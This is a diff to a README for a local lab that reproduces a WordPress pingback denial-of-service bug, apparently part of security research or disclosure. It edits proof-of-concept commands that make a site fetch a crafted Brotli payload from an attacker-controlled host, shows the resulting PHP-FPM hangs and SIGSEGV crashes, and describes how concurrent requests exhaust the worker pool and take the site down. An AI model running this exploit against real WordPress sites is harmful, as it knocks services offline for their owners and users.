@@ -105,14 +105,37 @@ python3 poc/pingback_poc.py \
   --target http://localhost:8080 \
   --mode hang \
   --payload-url http://attacker:8080/small.br \
-  --workers 4 --count 4 --show-logs
+  --workers 1 --count 1 --timeout 12 --show-logs
 ```
 
-The PoC sends four concurrent pingbacks. All four workers spin. php-fpm
-kills them after `request_terminate_timeout = 15s`. The site is unavailable
-while the pool is occupied.
+The stock image uses `pm = dynamic` with `pm.max_children = 5` and no
+`request_terminate_timeout`. One pingback pins one worker at 100% CPU. PHP-FPM
+still has `max_execution_time = 30` for the FPM SAPI, so the request is
+eventually ended with exit code 124; the site stays up on the other workers
+in the meantime.
 
-Look for:
+```text
+[1] <- timeout after 12.0s
+[*] summary
+    hung                     1
+[*] site after  : HTTP 200 in 0.0s (attack took 12.0s)
+[*] note: the stock php-fpm config has no request_terminate_timeout;
+    PHP-FPM max_execution_time (30s) is the fallback. Use
+    `make restart` to recover immediately.
+```
+
+After roughly 30 seconds the master logs:
+
+```text
+WARNING: [pool www] child 10 exited with code 124 after 37.713889 seconds from start
+```
+
+`make hang-pool` sends five concurrent requests, which occupy all five
+workers for up to ~30 seconds and take the site down for that window.
+`make restart` recovers immediately.
+
+If you mount the optional `lab/php-fpm/zz-lab.example.conf`, php-fpm gets a
+15-second `request_terminate_timeout` and logs:
 
 ```text
 WARNING: [pool www] child 43 execution timed out (15.0 sec), terminating
@@ -128,31 +151,19 @@ python3 poc/pingback_poc.py \
   --target http://localhost:8080 \
   --mode crash \
   --payload-url http://attacker:8080/payload.br \
-  --workers 4 --count 4 --show-logs
+  --workers 1 --count 1 --timeout 30 --show-logs
 ```
 
 Each pingback makes the worker decode the 23 MB stream and die with
-`SIGSEGV`. Look for:
+`SIGSEGV`. One request is enough to prove the bug. Look for:
 
 ```text
 WARNING: [pool www] child 42 exited on signal 11 (SIGSEGV) after 1.2 seconds from start
 ```
 
-`make crash` sends four by default because each crash only removes one of
-the four workers; the site stays up between respawns. One crash is enough to
-prove the bug.
-
-### One request at a time
-
-```bash
-python3 poc/pingback_poc.py \
-  --target http://localhost:8080 \
-  --mode crash \
-  --payload-url http://attacker:8080/payload.br \
-  --workers 1 --count 1 --timeout 30 --show-logs
-```
-
-Use this when you want a clean single `SIGSEGV` line in the log.
+The site stays up after a single crash because php-fpm respawns the worker.
+`make crash-pool` sends five concurrent requests to exhaust the default
+five-worker pool.
 
 ---
 
@@ -164,9 +175,8 @@ docker compose exec wordpress ps aux | grep php-fpm
 docker compose exec wordpress sh -c 'ss -ltnp | grep 9000'
 ```
 
-`php-fpm` runs as PID 1 in the container. The master logs child exits to
-stdout because `catch_workers_output = yes` is set in
-`lab/php-fpm/zz-lab.conf`.
+`php-fpm` runs as PID 1 in the container. The master logs child exits
+(including `SIGSEGV`) to stdout even with the stock config.
 
 To watch CPU during a hang:
 
@@ -180,16 +190,35 @@ A single hung worker sits near 100% of one core.
 
 ## Changing the lab
 
-### More workers
+### Worker limits
 
-Edit `lab/php-fpm/zz-lab.conf`:
+The stock `www.conf` is `pm = dynamic`, `pm.max_children = 5`, with no
+`request_terminate_timeout`. That is enough for the crash: a SIGSEGV kills
+the worker regardless of pool settings. A hang is bounded by PHP-FPM's
+`max_execution_time = 30` (exit code 124).
 
-```ini
-pm.max_children = 8
-request_terminate_timeout = 30s
+For a deterministic four-worker static pool and a 15-second request timeout,
+uncomment this volume in `docker-compose.yml`:
+
+```yaml
+- ./lab/php-fpm/zz-lab.example.conf:/usr/local/etc/php-fpm.d/zz-lab.conf:ro
 ```
 
-Then `docker compose up -d --force-recreate wordpress`.
+The example file contains:
+
+```ini
+[www]
+pm = static
+pm.max_children = 4
+pm.max_requests = 0
+request_terminate_timeout = 15s
+catch_workers_output = yes
+decorate_workers_output = no
+```
+
+Then `docker compose up -d --force-recreate wordpress`. With this config,
+`make hang` is killed after 15 seconds and the site recovers by itself;
+`make hang-pool` needs four requests instead of five.
 
 ### Different WordPress version
 
@@ -286,8 +315,8 @@ Switch to the pinned image digest or rebuild the lab on a vulnerable base.
 
 * php-fpm may not log child exits at your log level; check
   `docker compose logs wordpress` without filters.
-* The worker may have been killed by `request_terminate_timeout` before the
-  tail arrived. Increase it temporarily and retry.
+* If you enabled the optional `request_terminate_timeout`, make sure it is
+  longer than the 23 MB transfer (about 3 seconds locally).
 * The payload may have been served without the chunk boundary. Check the
   attacker logs and the `CHUNK_DELAY` value.
 
